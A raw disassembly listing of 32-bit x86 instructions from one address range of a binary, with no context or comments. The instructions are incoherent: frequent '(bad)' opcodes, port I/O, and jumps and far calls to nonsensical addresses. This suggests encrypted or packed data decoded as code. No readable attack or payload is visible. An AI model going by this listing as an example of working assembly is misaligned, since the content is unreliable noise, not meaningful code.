  40292c:	push   ebp
  40292d:	jge    0x4028f4
  40292f:	xchg   edi,eax
  402930:	(bad)  
  402931:	push   ebx
  402932:	xor    eax,0x44716fb0
  402937:	inc    esi
  402938:	push   ecx
  402939:	cld    
  40293a:	stc    
  40293b:	out    dx,eax
  40293c:	sub    DWORD PTR [ecx+0x13bc1ba4],ebp
  402942:	mov    al,BYTE PTR [edx+esi*1]
  402945:	inc    ecx
  402946:	sub    eax,DWORD PTR [ecx-0x2a]
  402949:	inc    esi
  40294a:	push   cs
  40294b:	pop    edi
  40294c:	inc    esi
  40294d:	sahf   
  40294e:	push   ss
  40294f:	push   0x12
  402951:	or     ebp,esp
  402953:	sub    eax,0x6522c191
  402958:	jl     0x402912
  40295a:	or     al,0x32
  40295c:	fidiv  WORD PTR ds:0xd71335e8
  402962:	ficom  WORD PTR [esi]
  402964:	mov    bl,cl
  402966:	add    DWORD PTR [ebx],ecx
  402968:	and    bh,dh
  40296a:	mov    WORD PTR [ebx],cs
  40296c:	jle    0x402916
  40296e:	int3   
  40296f:	sub    dh,BYTE PTR [ecx]
  402971:	stos   DWORD PTR es:[edi],eax
  402972:	cld    
  402973:	or     BYTE PTR [ecx],bh
  402975:	sbb    bh,BYTE PTR [esi+ecx*2-0x453790ce]
  40297c:	mov    al,0x5d
  40297e:	cmp    esp,DWORD PTR [ecx+eiz*8-0x56]
  402982:	sbb    eax,0xa3c99ab8
  402987:	sub    al,0xcf
  402989:	sbb    ebp,ecx
  40298b:	and    DWORD PTR [ebx+0x34b6abbd],0x76
  402992:	out    dx,eax
  402993:	out    dx,al
  402994:	pop    ebp
  402995:	or     BYTE PTR [ecx-0x5dd11ad4],ch
  40299b:	out    0xa9,eax
  40299d:	mov    ebx,DWORD PTR [esi]
  40299f:	fild   DWORD PTR [ebp+0x1a]
  4029a2:	rcr    esp,0xbf
  4029a5:	mov    dh,0xc2
  4029a7:	add    DWORD PTR [esi+0x29],ebx
  4029aa:	cmp    dl,BYTE PTR [ebx+0x227a0eb2]
  4029b0:	data16 sbb BYTE PTR ds:0xc20be7,0xc0
  4029b8:	xor    al,0x6a
  4029ba:	fsub   QWORD PTR [ebx]
  4029bc:	test   BYTE PTR [edx-0x238a3734],ch
  4029c2:	repnz add BYTE PTR [ebx],ch
  4029c5:	(bad)  
  4029c7:	lea    ebp,[ebp+0x2a70ee62]
  4029cd:	and    eax,0x12a6324b
  4029d2:	(bad)  
  4029d3:	pop    ebp
  4029d4:	cmp    ch,BYTE PTR [edi-0x7949302d]
  4029da:	ds jle 0x402999
  4029dd:	pop    esp
  4029de:	push   cs
  4029df:	ret    0x674a
  4029e2:	dec    edx
  4029e3:	fnstcw WORD PTR [edi+0x234f1947]
  4029e9:	call   0x2371:0x693672ee
  4029f0:	sbb    al,0xe7
  4029f2:	ret    
  4029f3:	test   eax,0x8b189184
  4029f8:	cs aas 
  4029fa:	in     al,dx
  4029fb:	scas   al,BYTE PTR es:[edi]
  4029fc:	dec    ecx
  4029fd:	dec    edi
  4029fe:	call   0x5ea5c034
  402a03:	push   cs
  402a04:	hlt    
  402a05:	mov    ebp,ds
  402a07:	nop
  402a08:	(bad)  
  402a09:	cmp    BYTE PTR [eax+eax*1+0x79],cl
  402a0d:	mov    eax,ds:0x5f7c448b
  402a12:	arpl   WORD PTR cs:[esi+esi*8],cx
  402a16:	jae    0x402a07
  402a18:	ss cld 
  402a1a:	(bad)  
  402a1b:	sub    edi,DWORD PTR [edi-0x3]
  402a1e:	aaa    
  402a1f:	mov    edx,0x8d694737
  402a24:	push   ds
  402a25:	popf   
  402a26:	pop    eax
  402a27:	or     al,BYTE PTR [ebp-0x44b74960]
  402a2d:	sbb    BYTE PTR [esi],0xde
  402a30:	jno    0x402a93
  402a32:	mov    cl,0xeb
  402a34:	sub    ebp,ebx
  402a36:	mov    ebx,0x70a2513c
  402a3b:	aam    0x47
  402a3d:	sub    eax,0x54a029a9
  402a42:	mov    eax,ds:0x4111b7c2
  402a47:	popa   
  402a48:	les    ebx,FWORD PTR [esi]
  402a4a:	imul   esi,DWORD PTR [eax+0xe],0x638507d1
  402a51:	push   cs
  402a52:	jne    0x402a37
  402a54:	icebp  
  402a55:	aas    
  402a56:	test   DWORD PTR [ebp-0x24],ebp
  402a59:	xchg   DWORD PTR ds:0x845518f,edi
  402a5f:	int    0xec
  402a61:	pop    edx
  402a62:	pop    edi
  402a63:	and    DWORD PTR [edi],edx
  402a65:	adc    DWORD PTR [ebx-0x16ee5942],ecx
  402a6b:	idiv   BYTE PTR ss:[edx]
  402a6e:	sahf   
  402a6f:	mov    eax,ds:0x873bb281
  402a74:	fbld   TBYTE PTR [ecx+ebx*8+0x3b558467]
  402a7b:	fist   WORD PTR [esi-0x595785d3]
  402a81:	jg     0x402a07
  402a83:	adc    ebx,ebp
  402a85:	test   al,0x31
  402a87:	jb     0x402a89
  402a89:	out    dx,eax
  402a8a:	xchg   edx,eax
  402a8b:	lods   al,BYTE PTR ds:[esi]
  402a8c:	es retf 0x95c6
  402a90:	xchg   ecx,esi
  402a92:	leave  
  402a93:	(bad)  [esp+eax*2]
  402a96:	scas   al,BYTE PTR es:[edi]
  402a97:	out    0x8c,eax
  402a99:	adc    ecx,DWORD PTR [eax-0x7a]
  402a9c:	jbe    0x402a25
  402a9e:	sbb    BYTE PTR [ebx+0x4b],cl
  402aa1:	adc    DWORD PTR [esi],edi
  402aa3:	or     eax,0xdbd79e83
  402aa8:	or     al,0xec
  402aaa:	push   0xc703ada8
  402aaf:	mov    DWORD PTR [edi+edi*2],esi
  402ab2:	(bad)  
  402ab3:	das    
  402ab4:	jae    0x402a69
  402ab6:	loopne 0x402abd
  402ab8:	mov    eax,ds:0xc119e39b
  402abd:	sbb    BYTE PTR [edi-0x3390bf8a],dh
  402ac3:	cmp    ebx,ebx
  402ac5:	sub    DWORD PTR [edx+eax*2-0x117fefe9],0xffffffe3
  402acd:	mov    al,0x56
  402acf:	ret    0x162
  402ad2:	dec    ebx
  402ad3:	nop
  402ad4:	jecxz  0x402ac7
  402ad6:	imul   DWORD PTR [edx+esi*8+0x3df85de]
  402add:	jnp    0x402b10
  402adf:	fild   QWORD PTR [edi-0x36]
  402ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae3:	shr    BYTE PTR ds:0xea074944,1
  402ae9:	mov    bl,BYTE PTR [esi-0x6b]
  402aec:	call   0xe0974d3a
  402af1:	sbb    dl,0x65
  402af4:	sbb    ch,BYTE PTR [ebp-0x9bc3a01]
  402afa:	cmp    DWORD PTR [eax-0xe],ebp
  402afd:	fldcw  WORD PTR [esi-0x3d]
  402b00:	ret    
  402b01:	push   edi
  402b02:	jmp    0xf1cb0069
  402b07:	mov    ds:0x9da8d707,eax
  402b0c:	jp     0x402ac6
  402b0e:	xor    al,0x71
  402b10:	mov    WORD PTR [ecx+0x59286833],?
  402b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b17:	sbb    ecx,DWORD PTR [edx+0x23]
  402b1a:	jae    0x402aa5
  402b1c:	sbb    eax,0xf091ef91
  402b21:	popf   
  402b22:	cs sti 
  402b24:	mov    al,0x87
  402b26:	pop    eax
  402b27:	sub    al,0xef
  402b29:	xor    DWORD PTR [ebx+0x3b],esp
  402b2c:	in     al,dx
  402b2d:	inc    ebp
  402b2e:	pop    ds
  402b2f:	in     eax,dx
  402b30:	xchg   edx,eax
  402b31:	or     BYTE PTR es:[esi-0x28],bh
  402b35:	cli    
  402b36:	jne    0x402b90
  402b38:	and    DWORD PTR [eax-0x22],edx
  402b3b:	or     BYTE PTR [edi+ebp*8+0x28],dl
  402b3f:	sub    bl,BYTE PTR [ebp-0x30344ebb]
  402b45:	push   esp
  402b46:	add    eax,0xe37efba8
  402b4b:	and    bh,BYTE PTR [ebx]
  402b4d:	fwait
  402b4e:	dec    ebx
  402b4f:	sbb    DWORD PTR [ecx-0x13b9d334],esi
  402b55:	nop
  402b56:	stc    
  402b57:	cmp    esi,DWORD PTR [edi+eax*1-0x7075fd85]
  402b5e:	ror    BYTE PTR [esi-0x4b28b5cd],cl
  402b64:	push   es
  402b65:	sbb    bh,dl
  402b67:	cmp    esp,DWORD PTR [esi-0x3d180f0a]
  402b6d:	mov    edx,0xa5722416
  402b72:	sbb    esp,DWORD PTR ds:[ebp+0x76]
  402b76:	mov    dh,0x18
  402b78:	and    dl,ch
  402b7a:	jnp    0x402b9a
  402b7c:	jl     0x402b15
  402b7e:	cvttps2pi mm7,QWORD PTR [esi]
  402b81:	mov    esp,0x4bd65e5d
  402b86:	(bad)  
  402b88:	mov    bh,0x95
  402b8a:	sar    BYTE PTR [ebp-0x31],0xe5
  402b8e:	inc    eax
  402b8f:	inc    esp
  402b90:	mov    cl,BYTE PTR [eax-0x7f5d0574]
  402b96:	jp     0x402b37
  402b98:	shl    ebx,0x82
  402b9b:	pop    edx
  402b9c:	push   cs
  402b9d:	shr    BYTE PTR [ecx+ebp*4+0x35a16d30],cl
  402ba4:	jmp    0x402b54
  402ba6:	popa   
  402ba7:	mov    ds:0x63de7681,al
  402bac:	ret    0x13a2
  402baf:	(bad)  
  402bb0:	fiadd  DWORD PTR [ebx-0x78b6a1df]
  402bb6:	xchg   esi,eax
  402bb7:	cmp    ah,bl
  402bb9:	adc    eax,0xfc5241be
  402bbe:	enter  0xb1bc,0x3a
  402bc2:	(bad)  
  402bc4:	adc    BYTE PTR [eax],cl
  402bc6:	sbb    edx,DWORD PTR [ecx-0x73b5c44f]
  402bcc:	inc    esp
  402bcd:	cld    
  402bce:	test   al,0xad
  402bd0:	scas   al,BYTE PTR es:[edi]
  402bd1:	xchg   edi,eax
  402bd2:	sbb    eax,0xef8123ef
  402bd7:	cdq    
  402bd8:	xchg   esp,eax
  402bd9:	inc    ecx
  402bda:	inc    edx
  402bdb:	add    al,0xe9
  402bdd:	jb     0x402b94
  402bdf:	int    0x5a
  402be1:	fsin   
  402be3:	jmp    0x1f3469f1
  402be8:	xor    DWORD PTR [esi-0x28d8e3c],edx
  402bee:	(bad)  
  402bf0:	rcr    BYTE PTR [edi],1
  402bf2:	adc    dl,BYTE PTR [eax+0x7]
  402bf5:	js     0x402bb0
  402bf7:	or     BYTE PTR [edx],cl
  402bf9:	shl    bl,1
  402bfb:	mov    ecx,0x40c86d7b
  402c00:	add    esi,DWORD PTR [ecx-0x40dc6470]
  402c06:	pop    ds
  402c07:	add    DWORD PTR [edx],esi
  402c09:	lods   al,BYTE PTR ds:[esi]
  402c0a:	xchg   ebx,eax
  402c0b:	in     eax,0x51
  402c0d:	call   0x4984c82a
  402c12:	dec    edx
  402c13:	aaa    
  402c14:	pop    es
  402c15:	call   0x1cf39251
  402c1a:	jno    0x402c1c
  402c1c:	into   
  402c1d:	dec    edi
  402c1e:	aad    0xd9
  402c20:	or     cl,BYTE PTR [esi-0x31572694]
  402c26:	scas   al,BYTE PTR es:[edi]
  402c27:	inc    esp
  402c28:	popa   
  402c29:	int    0x22
  402c2b:	call   0x9dd2246e
  402c30:	jb     0x402bd6
  402c32:	fimul  DWORD PTR [esi]
  402c34:	pop    esi
  402c35:	push   edx
  402c36:	adc    DWORD PTR [esi],esi
  402c38:	(bad)  
  402c39:	rcr    BYTE PTR [edi-0x7b60cea],cl
  402c3f:	and    eax,0x24e7349c
  402c44:	mov    esp,0xf90e8d1c
  402c49:	dec    ebp
  402c4a:	dec    esi
  402c4b:	jmp    0x402bf1
  402c4d:	mov    eax,gs:0x577d2507
  402c53:	xor    esi,ebx
  402c55:	ins    BYTE PTR es:[edi],dx
  402c56:	inc    ebx
  402c57:	std    
  402c58:	dec    edx
  402c59:	repnz aas 
  402c5b:	les    ecx,FWORD PTR [edx+0x16]
  402c5e:	call   0x9bdb:0xc50b85fb
  402c65:	cmc    
  402c66:	aam    0xd3
  402c68:	out    dx,al
  402c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6a:	xor    ah,BYTE PTR [edi+0xe]
  402c6d:	lods   eax,DWORD PTR ds:[esi]
  402c6e:	add    DWORD PTR [ecx-0x20],0x92a460ae
  402c75:	sub    ebp,DWORD PTR [esi]
  402c77:	cmc    
  402c78:	or     DWORD PTR [ebx+0x8],0xfffffff2
  402c7c:	(bad)  
  402c7d:	push   edx
  402c7e:	push   DWORD PTR [ebp+eiz*4+0x521ee6bd]
  402c85:	sahf   
  402c86:	gs clc 
  402c88:	dec    ebp
  402c89:	in     eax,dx
  402c8a:	adc    DWORD PTR [ebp+0x7b],edx
  402c8d:	pop    ebp
  402c8e:	addr16 add al,0x99
  402c91:	xchg   ebp,eax
  402c92:	cld    
  402c93:	cld    
  402c94:	mov    ebp,0x785597ec
  402c99:	push   ebx
  402c9a:	dec    ecx
  402c9b:	mov    edx,0x266e4cc1
  402ca0:	mov    ebp,0xff3875af
  402ca5:	push   ebx
  402ca6:	jno    0x402c91
  402ca8:	sub    DWORD PTR [edx+edx*1+0x6f],ebx
  402cac:	cmp    eax,0x5a40117a
  402cb1:	mov    dh,BYTE PTR [ebp-0x7610d92f]
  402cb7:	enter  0x9e98,0x49
  402cbb:	lahf   
  402cbc:	es jge 0x402d25
  402cbf:	push   cs
  402cc0:	lahf   
  402cc1:	pop    ss
  402cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cc3:	mov    edi,0xc866c24
  402cc8:	dec    esi
  402cc9:	fldz   
  402ccb:	xor    esi,esi
  402ccd:	sahf   
  402cce:	xchg   edi,eax
  402ccf:	fist   WORD PTR [bp+si]
  402cd2:	inc    eax
  402cd3:	mov    eax,ds:0x7973e106
  402cd8:	les    esi,FWORD PTR [edi]
  402cda:	mov    ch,0x71
  402cdc:	adc    ebx,0x54
  402cdf:	scas   al,BYTE PTR es:[edi]
  402ce0:	data16 sbb al,0xdd
  402ce3:	leave  
  402ce4:	lods   al,BYTE PTR ds:[esi]
  402ce5:	fs mov bh,0x55
  402ce8:	add    al,0x13
  402cea:	popf   
  402ceb:	adc    DWORD PTR [edi-0x7e39c24a],0x60bb1f46
  402cf5:	in     al,dx
  402cf6:	or     eax,0xeadc9fd
  402cfb:	(bad)  
  402cfc:	sahf   
  402cfd:	dec    edi
  402cfe:	push   ss
  402cff:	mov    bh,0x33
  402d01:	mov    edx,0x7d315504
  402d06:	pop    ebx
  402d07:	out    dx,eax
  402d08:	fwait
  402d09:	xchg   edx,eax
  402d0a:	add    ch,dh
  402d0c:	push   ebx
  402d0d:	and    BYTE PTR [esi+eiz*8-0x5e],bl
  402d11:	and    al,0x79
  402d13:	pusha  
  402d14:	sbb    BYTE PTR [edi+ebx*4],al
  402d17:	sbb    cl,BYTE PTR [edi]
  402d19:	retf   0x48b
  402d1c:	add    bl,ch
  402d1e:	and    al,0x73
  402d20:	inc    esp
  402d21:	bswap  edx
  402d23:	mov    ds:0xd0f6312,al
  402d28:	jge    0x402d3b
  402d2a:	mov    ch,0x74
  402d2c:	inc    ebx
  402d2d:	xor    ecx,DWORD PTR [edx-0x74]
  402d30:	push   es
  402d31:	ror    DWORD PTR [esi+0x685363d2],0x9
  402d38:	es sbb al,ah
  402d3b:	cmp    DWORD PTR [ebx],esi
  402d3d:	and    DWORD PTR [ebp-0x3ac6ac76],edx
  402d43:	jmp    0x402d2c
  402d45:	mov    ebp,0x4bd2ad0
  402d4a:	pop    ecx
  402d4b:	loop   0x402d1b
  402d4d:	lods   al,BYTE PTR ds:[esi]
  402d4e:	jno    0x402da6
  402d50:	cmp    esp,DWORD PTR [esi-0x47]
  402d53:	inc    ecx
  402d54:	jge    0x402d4f
  402d56:	cmp    ebx,edi
  402d58:	push   esi
  402d59:	xchg   esp,eax
  402d5a:	jmp    0xcd4072bf
  402d5f:	jmp    0x402ce3
  402d61:	outs   dx,DWORD PTR ds:[esi]
  402d62:	or     edi,edi
  402d64:	inc    esp
  402d65:	repz into 
  402d67:	popa   
  402d68:	mov    edx,ebx
  402d6a:	ss xchg esi,eax
  402d6c:	shr    BYTE PTR [ecx+eax*2-0x4c],0xc
  402d71:	fiadd  WORD PTR [esi+0x3a0327ad]
  402d77:	(bad)  
  402d79:	xor    edi,DWORD PTR [edx]
  402d7b:	sahf   
  402d7c:	mov    ds:0xb7a17868,eax
  402d81:	pop    edx
  402d82:	xchg   esp,eax
  402d83:	test   BYTE PTR [edx],bh
  402d85:	pop    edi
  402d86:	int3   
  402d87:	pop    edi
  402d88:	les    ecx,FWORD PTR [edx]
  402d8a:	loop   0x402d6b
  402d8c:	pop    esp
  402d8d:	or     eax,0x433d0003
  402d92:	xlat   BYTE PTR ds:[ebx]
  402d93:	shl    DWORD PTR [ebp-0x29692891],cl
  402d99:	out    dx,eax
  402d9a:	fld    DWORD PTR [edi+ebp*4-0x58f64014]
  402da1:	imul   esi,DWORD PTR [esi-0x30c22b2d],0xcb758868
  402dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dac:	sub    al,0x13
  402dae:	xor    bh,BYTE PTR [eax-0x24]
  402db1:	add    bh,dl
  402db3:	mov    WORD PTR [ebx+edx*1+0x58c10805],ds
  402dba:	cmp    BYTE PTR [ebp-0x2e1ba800],dh
  402dc0:	xchg   DWORD PTR [edx+0x75],esi
  402dc3:	cmp    ebp,DWORD PTR [edx+edi*4+0x7f]
  402dc7:	and    DWORD PTR [edi],eax
  402dc9:	mov    edi,DWORD PTR [ebx+0x4b]
  402dcc:	retf   0x1380
  402dcf:	sub    bh,dh
  402dd1:	lahf   
  402dd2:	pop    ebx
  402dd3:	dec    ebp
  402dd4:	aaa    
  402dd5:	mov    edi,DWORD PTR [edi]
  402dd7:	pop    ecx
  402dd8:	dec    esi
  402dd9:	mov    edi,0xd9bf2e27
  402dde:	stos   DWORD PTR es:[edi],eax
  402ddf:	pop    edx
  402de0:	rol    DWORD PTR [eax+0x52],0xe5
  402de4:	(bad)  
  402de5:	rcl    bh,cl
  402de7:	mov    ecx,0x12cdfbb7
  402dec:	cwde   
  402ded:	mov    ecx,0x47d43725
  402df2:	repnz push es
  402df4:	add    dh,BYTE PTR [bx+0x62]
  402df8:	bound  ecx,QWORD PTR [edx]
  402dfa:	sbb    eax,0x2ef639f4
  402dff:	into   
  402e00:	rcr    DWORD PTR [eax-0x12],0x58
  402e04:	sub    bh,BYTE PTR [esi-0x1]
  402e07:	(bad)  
  402e09:	mul    BYTE PTR [edi+ecx*4]
  402e0c:	or     eax,0x6f5e9df
  402e11:	sbb    eax,0x4e0ac1ae
  402e16:	fiadd  WORD PTR [eax+0x7e89a55c]
  402e1c:	jle    0x402dd5
  402e1e:	aaa    
  402e1f:	push   ds
  402e20:	or     DWORD PTR [esi+esi*2],ecx
  402e23:	int3   
  402e24:	aas    
  402e25:	pushf  
  402e26:	cld    
  402e27:	(bad)  
  402e28:	jg     0x402e9e
  402e2a:	dec    ebp
  402e2b:	sub    al,0xfc
  402e2d:	int    0x98
  402e2f:	dec    esp
  402e30:	rcl    BYTE PTR [ebx+0x65df6d0d],cl
  402e36:	sub    dl,BYTE PTR [esi+eax*4+0x15030909]
  402e3d:	test   eax,0xe0916b3a
  402e42:	mov    ebx,ebp
  402e44:	lods   al,BYTE PTR ds:[esi]
  402e45:	cs xchg ecx,eax
  402e47:	or     ecx,DWORD PTR [eax+0x35060540]
  402e4d:	inc    ebx
  402e4e:	mov    dl,0xe0
  402e50:	aas    
  402e51:	mov    ebx,?
  402e53:	popf   
  402e54:	mov    bl,0xc4
  402e56:	scas   eax,DWORD PTR es:[edi]
  402e57:	loopne 0x402de4
  402e59:	xor    DWORD PTR [eax+ebx*4+0x46],edi
  402e5d:	xor    al,BYTE PTR [ebx-0x6d]
  402e60:	rol    BYTE PTR [eax],0xac
  402e63:	mov    WORD PTR [edx],fs
  402e65:	jae    0x402ea1
  402e67:	mov    cl,BYTE PTR [edx]
  402e69:	lods   al,BYTE PTR ds:[esi]
  402e6a:	aaa    
  402e6b:	aaa    
  402e6c:	ja     0x402e2c
  402e6e:	sbb    eax,0xba5db1a5
  402e73:	mov    ebx,0x4c6a2797
  402e78:	sti    
  402e79:	xor    eax,0xf43f96b6
  402e7e:	in     eax,0x10
  402e80:	test   DWORD PTR [ecx+0x22],ebx
  402e83:	lock sti 
  402e85:	das    
  402e86:	shr    DWORD PTR [ecx+0x2771dc6d],1
  402e8c:	scas   eax,DWORD PTR es:[edi]
  402e8d:	xchg   ecx,eax
  402e8e:	add    BYTE PTR [ebx-0x745171bf],al
  402e94:	push   cs
  402e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e96:	popf   
  402e97:	sbb    ah,BYTE PTR [eax-0x55c59ad9]
  402e9d:	cmp    BYTE PTR [edx-0x770b0a14],ch
  402ea3:	cmc    
  402ea4:	or     ecx,eax
  402ea6:	fwait
  402ea7:	mov    edx,0xb5869ef8
  402eac:	dec    esi
  402ead:	fimul  WORD PTR [eax]
  402eaf:	mov    edx,0x570b550c
  402eb4:	mov    ss,WORD PTR ds:0x2c88ceb4
  402eba:	jl     0x402edb
  402ebc:	jns    0x402ec8
  402ebe:	outs   dx,DWORD PTR ds:[esi]
  402ebf:	mov    ds:0x3ae34c9b,al
  402ec4:	and    BYTE PTR [ebx+eax*8-0x60],bl
  402ec8:	push   edi
  402ec9:	in     eax,0x28
  402ecb:	inc    ebx
  402ecc:	or     DWORD PTR [ebx+0x3595c3d2],ebp
  402ed2:	pop    ebx
  402ed3:	and    DWORD PTR [edi+edi*2+0x45],esi
  402ed7:	in     al,dx
  402ed8:	inc    esp
  402ed9:	mov    edi,0x3306872b
  402ede:	ss iret 
  402ee0:	cmp    eax,0x4ec19cef
  402ee5:	adc    ecx,DWORD PTR [esp+eiz*8-0x13]
  402ee9:	push   edx
  402eea:	dec    ebp
  402eeb:	loop   0x402f48
  402eed:	push   ebp
  402eee:	xor    eax,0x275125b0
  402ef3:	or     esp,DWORD PTR ds:0xf2d98d1c
  402ef9:	lds    ebp,FWORD PTR [ecx+0x3b]
  402efc:	jns    0x402f6c
  402efe:	loop   0x402f1a
  402f00:	dec    BYTE PTR [edi-0x65]
  402f03:	mov    eax,0x366c2254
  402f08:	sbb    al,0xf6
  402f0a:	and    BYTE PTR [ebp+0x537f3515],ch
  402f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f11:	dec    esp
  402f12:	ss stos BYTE PTR es:[edi],al
  402f14:	les    esp,FWORD PTR [ebx+0x120ca08a]
  402f1a:	cmp    edx,ecx
  402f1c:	loop   0x402f44
  402f1e:	pop    es
  402f1f:	stos   DWORD PTR es:[edi],eax
  402f20:	and    DWORD PTR [ebx+0x487cf55a],ebx
  402f26:	mov    ds:0x8f1fb6fb,eax
  402f2b:	push   ebp
  402f2c:	mov    ch,0x3f
  402f2e:	jbe    0x402f7e
  402f30:	mov    bh,0x17
  402f32:	mov    al,ds:0x54c525a4
  402f37:	nop
  402f38:	add    DWORD PTR [ebx],ebp
  402f3a:	sbb    ch,BYTE PTR [eax]
  402f3c:	rcr    edi,0x21
  402f3f:	pinsrw mm2,ebx,0x87
  402f43:	xchg   DWORD PTR [edi],ebx
  402f45:	popa   
  402f46:	push   0xfffffffd
  402f48:	pcmpgtb mm0,mm7
  402f4b:	cs (bad) 
  402f4e:	div    BYTE PTR [ebx-0x5d7e6bfc]
  402f54:	retf   
  402f55:	outs   dx,DWORD PTR ds:[esi]
  402f56:	xchg   esi,eax
  402f57:	add    eax,0x2b80d845
  402f5c:	(bad)  
  402f5e:	jl     0x402f05
  402f60:	ins    BYTE PTR es:[edi],dx
  402f61:	mov    dl,0xed
  402f63:	test   al,0xbd
  402f65:	jnp    0x402fa7
  402f67:	mov    DWORD PTR [edi-0x3c940d05],esi
  402f6d:	jo     0x402f2a
  402f6f:	mov    esp,0x66cff97e
  402f74:	push   cs
  402f75:	arpl   WORD PTR [ecx],bx
  402f77:	inc    ebp
  402f78:	dec    edi
  402f79:	clc    
  402f7a:	es sub esi,eax
  402f7d:	inc    eax
  402f7e:	inc    eax
  402f7f:	and    eax,0xab514ec8
  402f84:	scas   eax,DWORD PTR es:[edi]
  402f85:	mov    bh,0x90
  402f87:	sub    al,0x45
  402f89:	call   DWORD PTR [ebp+0xe6586d9]
  402f8f:	sahf   
  402f90:	pop    esi
  402f91:	dec    ebx
  402f92:	(bad)  
  402f94:	xchg   ebp,eax
  402f95:	sub    DWORD PTR [ebx-0x43f99e99],esp
  402f9b:	mov    edi,0x87093daf
  402fa0:	mov    eax,0xcf397472
  402fa5:	lea    eax,[esi+0x1474508b]
  402fab:	push   es
  402fac:	in     eax,dx
  402fad:	sbb    esi,0x400cc5b7
  402fb3:	pusha  
  402fb4:	and    DWORD PTR [edi-0x561f2616],ebp
  402fba:	popa   
  402fbb:	int3   
  402fbc:	jmp    0xc9fb:0x4d406207
  402fc3:	push   esi
  402fc4:	sub    bh,dl
  402fc6:	outs   dx,BYTE PTR ds:[esi]
  402fc7:	pop    esp
  402fc8:	shl    BYTE PTR [esi],cl
  402fca:	and    eax,0x86097766
  402fcf:	cmp    BYTE PTR [ecx],ch
  402fd1:	int3   
  402fd2:	add    edx,DWORD PTR [ecx+0x49]
  402fd5:	sub    DWORD PTR [edx+esi*2+0x393145c0],eax
  402fdc:	test   BYTE PTR [edx],cl
  402fde:	mov    bh,0xf8
  402fe0:	push   esp
  402fe1:	sub    bh,BYTE PTR ds:[ebx-0x5f783261]
  402fe8:	stos   BYTE PTR es:[edi],al
  402fe9:	std    
  402fea:	xchg   esp,eax
  402feb:	mov    ds:0xa7d341e4,eax
  402ff0:	ins    DWORD PTR es:[edi],dx
  402ff1:	lds    edi,FWORD PTR [esi]
  402ff3:	xchg   ecx,eax
  402ff4:	lods   eax,DWORD PTR ds:[esi]
  402ff5:	sbb    edi,DWORD PTR [ecx]
  402ff7:	cwde   
  402ff8:	pop    ecx
  402ff9:	arpl   dx,bx
  402ffb:	xor    eax,0xc9510429
  403000:	ror    BYTE PTR [eax-0x19],1
  403003:	cdq    
  403004:	xor    esi,DWORD PTR [eax-0x29e6e483]
  40300a:	pop    ds
  40300b:	adc    DWORD PTR [ebp+0x1bd1a304],ebx
  403011:	ret    0x9781
  403014:	test   al,0xa6
  403016:	and    DWORD PTR [ebx+0x13ee8f36],0x6
  40301d:	popf   
  40301e:	lds    esi,FWORD PTR [ebp-0x630008db]
  403024:	mov    ebp,esp
  403026:	loope  0x403003
  403028:	xor    edx,edi
  40302a:	hlt    
  40302b:	retf   
  40302c:	sti    
  40302d:	push   ss
  40302e:	cdq    
  40302f:	pop    edx
  403030:	inc    eax
  403031:	loop   0x403021
  403033:	mov    ds:0x3c0c3a0d,al
  403038:	fist   DWORD PTR [ebx+esi*4-0x6e]
  40303c:	xor    BYTE PTR [ecx-0x27],dh
  40303f:	in     eax,0xe3
  403041:	push   es
  403042:	push   ecx
  403043:	lahf   
  403044:	mov    bl,0x38
  403046:	xchg   DWORD PTR [eax+eiz*2],edi
  403049:	xor    eax,0x530ce191
  40304e:	inc    edx
  40304f:	inc    edx
  403050:	push   0xfffffffc
  403052:	imul   ebx,DWORD PTR [ecx+0x43],0x74
  403056:	xor    BYTE PTR [eax+0x42],ch
  403059:	rol    BYTE PTR [ebp+0x57f4e1f5],0x7a
  403060:	out    0x4e,eax
  403062:	in     eax,0x4f
  403064:	into   
  403065:	daa    
  403066:	jl     0x4030da
  403068:	push   edi
  403069:	jae    0x40306e
  40306b:	mov    ?,esi
  40306d:	or     eax,0x80802738
  403072:	inc    eax
  403073:	pop    ss
  403074:	shr    ebp,0xa2
  403077:	lahf   
  403078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403079:	sub    eax,DWORD PTR [edx]
  40307b:	es jns 0x4030a2
  40307e:	jbe    0x4030a4
  403080:	and    eax,0x76783c7f
  403085:	xchg   esp,eax
  403086:	jnp    0x4030a3
  403088:	cmp    al,0x56
  40308a:	scas   al,BYTE PTR es:[edi]
  40308b:	cmp    al,0xd5
  40308d:	pop    ds
  40308e:	pop    ebp
  40308f:	mov    al,BYTE PTR [ebp-0x551c449d]
  403095:	outs   dx,DWORD PTR ds:[esi]
  403096:	sub    DWORD PTR [ebx+0x5f],ebp
  403099:	and    ecx,DWORD PTR [ebx]
  40309b:	fadd   st(1),st
  40309d:	ror    ebp,0x39
  4030a0:	sbb    eax,0xedf67516
  4030a5:	mov    al,0x39
  4030a7:	xchg   BYTE PTR [eax+edi*8-0x5c],bh
  4030ab:	adc    eax,edi
  4030ad:	push   ebp
  4030ae:	clc    
  4030af:	je     0x403049
  4030b1:	je     0x4030d0
  4030b3:	fs je  0x4030b4
  4030b6:	aad    0x33
  4030b8:	cwde   
  4030b9:	arpl   WORD PTR [ebx-0x76],ax
  4030bc:	(bad)  
  4030be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030bf:	scas   eax,DWORD PTR es:[edi]
  4030c0:	push   ecx
  4030c1:	xchg   ebx,eax
  4030c2:	sub    eax,0x3a4b7fd5
  4030c7:	mov    ecx,eax
  4030c9:	stos   DWORD PTR es:[edi],eax
  4030ca:	push   0x6ddd59cb
  4030cf:	lds    ecx,FWORD PTR [ebp+edx*2-0x65762248]
  4030d6:	mov    ds:0xc5f7b4e,eax
  4030db:	push   ds
  4030dc:	aas    
  4030dd:	dec    BYTE PTR [eax-0x4804458c]
  4030e3:	push   cs
  4030e4:	test   DWORD PTR ds:0x562d8186,edi
  4030ea:	jbe    0x40309f
  4030ec:	push   es
  4030ed:	add    al,0x76
  4030ef:	imul   esp,DWORD PTR [ebx],0x9fa7cc9c
  4030f5:	pusha  
  4030f6:	mov    al,ds:0xf238d203
  4030fb:	in     eax,dx
  4030fc:	pop    edi
  4030fd:	jnp    0x403132
